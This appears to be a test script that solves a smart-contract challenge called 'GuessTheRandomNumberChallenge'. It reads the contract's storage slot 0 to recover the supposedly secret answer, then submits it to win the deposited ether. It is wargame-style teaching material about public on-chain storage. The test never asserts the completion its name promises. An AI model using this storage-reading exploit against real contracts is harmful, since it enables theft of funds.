const { expect } = require("chai");

describe("GuessTheRandomNumberChallenge", () => {
  let instance;

  beforeEach(async () => {
    const GTRN = await ethers.getContractFactory(
      "GuessTheRandomNumberChallenge"
    );
    instance = await GTRN.deploy({ value: ethers.utils.parseEther("1.0") });
    await instance.deployed();
  });

  it("isComplete() should return true", async () => {
    // read the slot 0 where the answer is stored
    let answer = await ethers.provider.getStorageAt(instance.address, 0);

    // now just guess
    await instance.guess(parseInt(answer), {
      value: ethers.utils.parseEther("1.0"),
    });
  });
});
